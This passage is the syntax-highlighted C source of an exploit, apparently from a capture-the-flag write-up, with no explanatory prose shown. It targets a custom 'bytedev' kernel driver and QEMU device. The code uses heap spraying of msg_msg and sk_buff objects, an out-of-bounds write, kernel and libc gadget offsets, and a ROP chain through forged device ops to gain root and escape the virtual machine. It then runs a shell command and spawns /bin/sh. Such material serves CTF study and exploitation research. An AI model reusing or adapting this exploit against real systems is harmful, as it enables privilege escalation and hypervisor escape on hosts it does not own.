class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;err.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_SIZE 0x1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_SIZE 0x400</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_TYPE    0x41</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_TYPE  0x42</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VICTIM_MSG_TYPE     0x1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TAG     0xAAAAAAAA</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SOCKET_NUM 8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SK_BUFF_NUM 128</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_NUM 256</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_QUEUE_NUM 4096</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MSG_COPY</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_COPY 040000</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff81e2d980</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810bb9c04</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff8224aca0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810bb710</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a01086</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff811af57d</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_BUF_SIZE (4096 - sizeof(struct bytedev_data))</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_MODE_CHANGE 0x114514</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_BLK_IDX_CHANGE 0x1919810</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_SECTOR_SIZE 512</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_SECTOR_NUM 256</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_SYSTEM 0x50d60</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_MOV_RSP_RDX_RET 0x5a170</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_MOV_RDX_PTRRDIADD8_MOV_PTRRSP_RAX_CALL_PTRRDXADD0x20 0x1675b0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_POP_RDI_RET 0x2a3e5</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_RET 0x2a3e6</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_BIN_SH 0x1d8698</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_PUTS 0x80ed0</span><br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">BYTEDEV_MODE</span> &#123;</span><br>    BYTEDEV_MODE_STREAM = <span class="hljs-number">0</span>,<br>    BYTEDEV_MODE_BLK,<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> len, offset;<br>    <span class="hljs-type">char</span> data[<span class="hljs-number">0</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125; primary_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span>  &#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125; secondary_msg;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * skb_shared_info need to take 320 bytes at the tail</span><br><span class="hljs-comment"> * so the max size of buf we should send is:</span><br><span class="hljs-comment"> * 1024 - 320 = 704</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">char</span> fake_second_msg[<span class="hljs-number">704</span>];<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) \<br>                + <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msgseg)];<br>&#125; oob_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    page;<br>    <span class="hljs-type">uint32_t</span>    offset, len;<br>    <span class="hljs-type">uint64_t</span>    ops;<br>    <span class="hljs-type">uint32_t</span>    flags;<br>    <span class="hljs-type">uint32_t</span>    padding;<br>    <span class="hljs-type">uint64_t</span>    private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    confirm;<br>    <span class="hljs-type">uint64_t</span>    release;<br>    <span class="hljs-type">uint64_t</span>    try_steal;<br>    <span class="hljs-type">uint64_t</span>    get;<br>&#125;;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\n\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">readMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">writeMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    *(<span class="hljs-type">long</span>*)msgp = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">peekMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-type">int</span> __msgsz = msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>);<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, __msgsz, msgtyp, MSG_COPY | IPC_NOWAIT);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">buildMsg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">uint64_t</span> m_list_next, <span class="hljs-type">uint64_t</span> m_list_prev, </span><br><span class="hljs-params">              <span class="hljs-type">uint64_t</span> m_type, <span class="hljs-type">uint64_t</span> m_ts,  <span class="hljs-type">uint64_t</span> next, <span class="hljs-type">uint64_t</span> security)</span><br>&#123;<br>    msg-&gt;m_list.next = m_list_next;<br>    msg-&gt;m_list.prev = m_list_prev;<br>    msg-&gt;m_type = m_type;<br>    msg-&gt;m_ts = m_ts;<br>    msg-&gt;next = next;<br>    msg-&gt;security = security;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">spraySkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++) &#123;<br>            <span class="hljs-keyword">if</span> (write(sk_socket[i][<span class="hljs-number">0</span>], buf, size) &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to spray %d sk_buff for %d socket!&quot;</span>, j, i);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">freeSkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++) &#123;<br>            <span class="hljs-keyword">if</span> (read(sk_socket[i][<span class="hljs-number">1</span>], buf, size) &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] failed to received sk_buff!&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">trigerOutOfBoundWrite</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd, <span class="hljs-type">int</span> socket_fd[<span class="hljs-number">2</span>])</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> *<span class="hljs-title">fake_data</span>;</span><br>    <span class="hljs-type">char</span> *trash_data;<br><br>    <span class="hljs-comment">/* free the first buffer in bytedev queue */</span><br>    trash_data = <span class="hljs-built_in">malloc</span>(BYTEDEV_BUF_SIZE);<br>    <span class="hljs-built_in">memset</span>(trash_data, <span class="hljs-number">0x84</span>, BYTEDEV_BUF_SIZE);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] write %ld bytes to dev \n&quot;</span>, <br>            write(dev_fd, trash_data, BYTEDEV_BUF_SIZE));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] read %ld bytes from dev\n&quot;</span>, <br>            read(dev_fd, trash_data, BYTEDEV_BUF_SIZE));<br><br>    <span class="hljs-comment">/* construct fake bytedev_data */</span><br>    fake_data = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> bytedev_data) + BYTEDEV_BUF_SIZE);<br>    fake_data-&gt;len = BYTEDEV_BUF_SIZE + <span class="hljs-number">1</span>;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] re-get the buffer by sk_buff...&quot;</span>);<br>    write(socket_fd[<span class="hljs-number">0</span>], fake_data, BYTEDEV_BUF_SIZE - <span class="hljs-number">320</span>);<br><br>    <span class="hljs-comment">/* make an OOB write */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] OOB write to nearby object...&quot;</span>);<br>    write(dev_fd, trash_data, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">/* to prevent the memory leaking */</span><br>    <span class="hljs-built_in">free</span>(trash_data);<br>    <span class="hljs-built_in">free</span>(fake_data);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">qemuEscape</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> dev_fd, ret;<br>    <span class="hljs-type">uint64_t</span> buf[BYTEDEV_SECTOR_SIZE / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)];<br>    <span class="hljs-type">uint64_t</span> fake_ops[BYTEDEV_SECTOR_SIZE / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)];<br>    <span class="hljs-type">uint64_t</span> libc_base, opaque, byte_dev_pmio_read;<br><br>    <span class="hljs-keyword">if</span> ((dev_fd = open(<span class="hljs-string">&quot;/dev/bytedev&quot;</span>, O_RDWR)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to open bytedev!&quot;</span>);<br>    &#125;<br><br>    ioctl(dev_fd, BYTEDEV_MODE_CHANGE, BYTEDEV_MODE_BLK);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * SECTOR -23: container</span><br><span class="hljs-comment">     * <span class="hljs-doctag">XXX:</span> in docker-built Ubuntu 22.04, we cannot leak libc there.</span><br><span class="hljs-comment">     *      [55] g_str_hash</span><br><span class="hljs-comment">     *      [56] g_str_equal</span><br><span class="hljs-comment">     * SECTOR -24: BYTEPCIDevState</span><br><span class="hljs-comment">     *      [27~34] name</span><br><span class="hljs-comment">     *      [35~] io_regions[PCI_NUM_REGIONS]</span><br><span class="hljs-comment">     * SECTOR -25: byte_dev_pmio_ops</span><br><span class="hljs-comment">     *      [0] byte_dev_pmio_read</span><br><span class="hljs-comment">     *      [1] byte_dev_pmio_write</span><br><span class="hljs-comment">     * SECTOR -355 &amp;io_regions[PCI_NUM_REGIONS]</span><br><span class="hljs-comment">     *      SECTOR -352 MemoryRegion - mmio</span><br><span class="hljs-comment">     *          [4] opaque</span><br><span class="hljs-comment">     *          [9] ops</span><br><span class="hljs-comment">     *      SECTOR -347 MemoryRegion - pmio</span><br><span class="hljs-comment">     *          [4] opaque</span><br><span class="hljs-comment">     *          [9] ops</span><br><span class="hljs-comment">     * SECTOR -388</span><br><span class="hljs-comment">     *      [8] &lt;g_str_hash&gt;</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.I leak basic info</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.I leak basic\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Reading from -388 sector...\033[0m&quot;</span>);<br><br>    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, <span class="hljs-number">-388</span>);<br>    read(dev_fd, buf, BYTEDEV_SECTOR_SIZE);<br><br>    <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">7</span>] &lt; <span class="hljs-number">0x7f0000000000</span>) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; BYTEDEV_SECTOR_SIZE / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>); i++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[--data-dump--][%d] %lx\n&quot;</span>, i, buf[i]);<br>        &#125;<br>        errExit(<span class="hljs-string">&quot;failed to leak libc related ptr!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* This&#x27;s the offset on the Ubuntu 22.04: GLIBC 2.35-0ubuntu3.1 */</span><br>    libc_base = buf[<span class="hljs-number">7</span>] - <span class="hljs-number">0x3ea410</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got libc_base: \033[0m%lx\n&quot;</span>, libc_base);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Reading from -25 sector...\033[0m&quot;</span>);<br><br>    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, <span class="hljs-number">-25</span>);<br>    read(dev_fd, fake_ops, BYTEDEV_SECTOR_SIZE);<br>    byte_dev_pmio_read = fake_ops[<span class="hljs-number">0</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got byte_dev_pmio_read: \033[0m%lx\n&quot;</span>, <br>            byte_dev_pmio_read);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Reading from -347 sector...\033[0m&quot;</span>);<br>    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, <span class="hljs-number">-347</span>);<br>    read(dev_fd, buf, <span class="hljs-number">10</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>));<br>    opaque = buf[<span class="hljs-number">4</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got opaque: \033[0m%lx\n&quot;</span>, opaque);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.II construct fake pmio-&gt;ops</span><br><span class="hljs-comment">     * There we make the opaque.parent_obj.name the ops,</span><br><span class="hljs-comment">     * so that nothing will be effects</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.II construct fake pmio-&gt;ops\033[0m&quot;</span>);<br>    <br>    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, <span class="hljs-number">-24</span>);<br>    read(dev_fd, buf, BYTEDEV_SECTOR_SIZE);<br><br>    buf[<span class="hljs-number">33</span>] = buf[<span class="hljs-number">34</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">strcpy</span>((<span class="hljs-type">char</span>*)&amp;buf[<span class="hljs-number">33</span>], <span class="hljs-string">&quot;ls;cat ./flag;gnome-calculator;/bin/sh&quot;</span>);<br><br>    <span class="hljs-comment">/* the new rdx starts there */</span><br>    buf[<span class="hljs-number">28</span>] = libc_base + LIBC_POP_RDI_RET;<br>    buf[<span class="hljs-number">29</span>] = opaque + <span class="hljs-number">33</span> * <span class="hljs-number">8</span>;<span class="hljs-comment">//libc_base + LIBC_BIN_SH;</span><br>    buf[<span class="hljs-number">30</span>] = libc_base + LIBC_SYSTEM;<br>    <span class="hljs-comment">//buf[31] = </span><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * [rdx + 20]</span><br><span class="hljs-comment">     * mov rsp, rdx ; ret</span><br><span class="hljs-comment">     */</span><br>    buf[<span class="hljs-number">32</span>] = libc_base + LIBC_MOV_RSP_RDX_RET;<br><br>    <span class="hljs-comment">/* the [rdi + 8] */</span><br>    buf[<span class="hljs-number">1</span>] = opaque + <span class="hljs-number">28</span> * <span class="hljs-number">8</span>;<br><br>    <span class="hljs-comment">/* fake ops on bar space */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>        buf[<span class="hljs-number">50</span> + i] = fake_ops[i];<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * mov rdx, qword ptr [rdi + 8] ; -&gt; store the ptr in opaque[1]</span><br><span class="hljs-comment">     * mov qword ptr [rsp], rax ; </span><br><span class="hljs-comment">     * call qword ptr [rdx + 0x20]  -&gt; another call</span><br><span class="hljs-comment">     */</span><br>    buf[<span class="hljs-number">51</span>] = <br>        libc_base + LIBC_MOV_RDX_PTRRDIADD8_MOV_PTRRSP_RAX_CALL_PTRRDXADD0x20;<br><br>    write(dev_fd, buf, BYTEDEV_SECTOR_SIZE);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Done!\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.III change pmio-&gt;ops to fake ops on opaque</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.III change pmio-&gt;ops to fake ops\033[0m&quot;</span>);<br><br>    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, <span class="hljs-number">-347</span>);<br>    read(dev_fd, buf, <span class="hljs-number">10</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>));<br><br>    buf[<span class="hljs-number">9</span>] = opaque + <span class="hljs-number">50</span> * <span class="hljs-number">8</span>;<br>    write(dev_fd, buf, <span class="hljs-number">10</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>));<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Done!\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.IV trigger fake pmio-&gt;ops.read to escape</span><br><span class="hljs-comment">     * There we need to set opaque[1] to opaque.parent_obj.name</span><br><span class="hljs-comment">     * and do something wonderful there...</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.IV trigger fake ops to escape\n\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">//sleep(5);</span><br>    ioctl(dev_fd, BYTEDEV_MODE_CHANGE, *(<span class="hljs-type">size_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (getuid()) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to gain the root!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m\n[*] Now we come to Stage II - QEMU ESCAPE\033[0m\n&quot;</span>);<br>    qemuEscape();<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] trigerring root shell now...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span 